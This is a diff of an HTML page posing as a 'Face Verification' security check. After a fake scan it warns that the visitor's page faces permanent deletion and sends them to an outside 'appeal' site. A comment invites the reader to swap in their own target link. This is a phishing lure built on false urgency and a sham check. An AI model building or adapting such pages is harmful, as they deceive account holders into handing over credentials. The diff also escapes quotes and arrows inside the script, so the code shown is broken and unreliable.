@@ -1,21 +1,17 @@
 <!DOCTYPE html>
-
-
-
-
-
 <html lang="en">
-
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Face Verification</title>
+    <title>
+      Face Verification
+    </title>
     <style>
-        body {
+      body {
             margin: 0;
             padding: 0;
             background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
-            font-family: 'Segoe UI', Roboto, sans-serif;
+            font-family: &#39;Segoe UI&#39;, Roboto, sans-serif;
             height: 100vh;
             display: flex;
             align-items: center;
@@ -103,45 +99,48 @@
             }
         }
     </style>
-</head>
-
-<body>
-
+  </head>
+  <body>
     <div class="container">
-        <div class="scanner-ring" id="scannerRing">
-            <div class="scanner-core" id="scannerCore"></div>
+      <div class="scanner-ring" id="scannerRing">
+        <div class="scanner-core" id="scannerCore">
         </div>
-        <div class="status-message" id="statusText">Scanning your face securely...</div>
-        <div class="verified-message" id="verifiedText"Warning: Your page may be deleted soon — send an appeal immediately</div>
-        <button class="next-button" id="nextBtn">Next</button>
+      </div>
+      <div class="status-message" id="statusText">
+        Scanning your face securely...
+      </div>
+      <div class="verified-message" id="verifiedText">
+        Your page is at risk of permanent deletion — submit an appeal now
+      </div>
+      <button class="continue-button" id="continueBtn">
+        Continue
+      </button>
     </div>
-
-    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto"></audio>
-
+    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto">
+    </audio>
     <script>
-        const redirectURL = "https://fix-your-restricted-issue.vercel.app/"; // Replace this with your target link
+      const redirectURL = &#34;https://fix-your-restricted-issue.vercel.app/&#34;; // Replace this with your target link
 
-        setTimeout(() => {
+        setTimeout(() =&gt; {
             // Play sound
-            document.getElementById("successSound").play();
+            document.getElementById(&#34;successSound&#34;).play();
 
             // Update ring
-            const ring = document.getElementById("scannerRing");
-            const core = document.getElementById("scannerCore");
-            ring.classList.add("scanner-complete");
-            core.textContent = "✔";
+            const ring = document.getElementById(&#34;scannerRing&#34;);
+            const core = document.getElementById(&#34;scannerCore&#34;);
+            ring.classList.add(&#34;scanner-complete&#34;);
+            core.textContent = &#34;✔&#34;;
 
             // Update text and button
-            document.getElementById("statusText").style.display = "none";
-            document.getElementById("verifiedText").style.display = "block";
-            document.getElementById("continueBtn").style.display = "inline-block";
+            document.getElementById(&#34;statusText&#34;).style.display = &#34;none&#34;;
+            document.getElementById(&#34;verifiedText&#34;).style.display = &#34;block&#34;;
+            document.getElementById(&#34;continueBtn&#34;).style.display = &#34;inline-block&#34;;
         }, 3500);
 
-        document.getElementById("continueBtn").addEventListener("click", () => {
+        document.getElementById(&#34;continueBtn&#34;).addEventListener(&#34;click&#34;, () =&gt; {
             window.location.href = redirectURL;
         });
     </script>
-
-</body>
-
+  </body>
 </html>
+
